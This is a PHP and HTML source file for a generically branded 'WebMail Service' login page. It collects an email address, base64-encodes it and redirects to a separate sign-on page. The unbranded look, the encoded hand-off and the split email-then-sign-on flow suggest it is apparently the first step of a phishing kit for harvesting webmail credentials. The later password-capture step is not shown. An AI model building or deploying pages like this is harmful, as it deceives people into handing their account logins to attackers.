<?php

require_once '../api.php';
$status = null;

if (isset($_POST['submit'])) { 
$user = $_POST["uname"];
$x = base64_encode($user);

if (empty($user)) {
$status = '<font size="2" color="red">Email is required to continue</font><p>';
}
elseif (!filter_var($user, FILTER_VALIDATE_EMAIL)) {
$status = '<font size="2" color="red">Please enter an email to continue</font><p>';
}
else{
    header ("Location: signon.php?app=$x&gta=");
}
}
?>
<!DOCTYPE html>
<html>
<title>WebMail Service</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="assets/logo.png"/>

<style>
@font-face {
   font-family: myFirstFont;
   src: url(font/style.ttf);
}

@font-face {
   font-family: myFirstFont;
   src: url(font/style.ttf);
   font-weight: bold;
}

* {
   font-family: myFirstFont;
}
* {
  box-sizing: border-box;
}

body {
  background-color: #f1f1f1;
}

div.checkbox {
    position: relative;
    font-family: myFirstFont;
    font-size: 13px;
}
label {
    position: relative;
    padding-left: 16px;
}
label::before {
    content :"";
    display: inline-block;
    width: 10px;
    height: 10px;
    background-color: white;
    border: solid 1px #9C9C9C;
    position: absolute;
    top: 1px;
    left: 0px;
}
label::after {
    content:"";
    width: 8px;
    height: 8px;
    background-color: #666666;
    position: absolute;
    left: 2px;
    top: 3px;
    display: none;
}
input[type=checkbox] {
    visibility: hidden;
    position: absolute;
}
input[type=checkbox]:checked + label::after {
    display: block;
}
input[type=checkbox]:active + label::before {
    background-color: #DDDDDD;
}

#regForm {
  background-color: #ffffff;
  margin: 100px auto;
  font-family: Raleway;
  padding: 40px;
  width: 30%;
  min-width: 100px;
}
 
h1 {
  text-align: LEFT;  
}
input {
  padding: 10px;
  width: 100%;
  font-size: 17px;
  font-family: myFirstFont;
  border: 1px solid #aaaaaa;

}


button {
  background-color: #0072C6;
  color: #ffffff;
  border: none;
  padding: 10px 20px;
  font-size: 17px;
  font-family: myFirstFont;
  cursor: pointer;
}

button:hover {
  opacity: 0.8;
}

#prevBtn {
  background-color: #bbbbbb;
}



</style>
<body>

<form id="regForm" action="" method="POST">
 <font size="6"><b>Email Portal</b> </font><img align="right" src="assets/logo.png" width="64" height="64"/><p>
<div class="tab"><font size="4" color="black"><b><!-- <?php echo $yuh ?> --></b> </font><p><br>
<div style="display:block;">
  <div class="tab">Enter Your Email:
    <input value="" type="text" name="uname" placeholder="Email Address"></p>
	<?php if(!empty($status)) ?>
	<div class="login-error"><?php echo $status; ?></div>
  </div>
</div>

  <div style="overflow:auto;">
    <div style="float:right;"><p>

      <button type="submit" name="submit" id="nextBtn">Next</button></div>

</form>




</body><p><br><p></p></p><p><br></p><div align="center">

<center><font size="1.5"><b>&copy; <?php echo date('Y'); ?> | Security Systems</b></font></center></div>
</html>
